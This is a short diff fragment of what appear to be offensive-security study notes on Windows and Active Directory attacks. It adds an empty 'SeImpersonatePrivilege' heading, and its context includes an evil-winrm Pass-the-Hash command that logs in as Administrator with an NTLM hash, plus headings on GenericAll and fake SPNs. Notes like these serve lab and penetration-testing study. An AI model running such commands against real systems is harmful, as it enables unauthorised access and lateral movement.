@@ -41,6 +41,9 @@ PassTheHash:
 ```
 evil-winrm -i 10.129.8.25 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
+
+### SeImpersonatePrivilege
+ 
 # Roles
 ## GenericAll
 Creating a Fake SPN
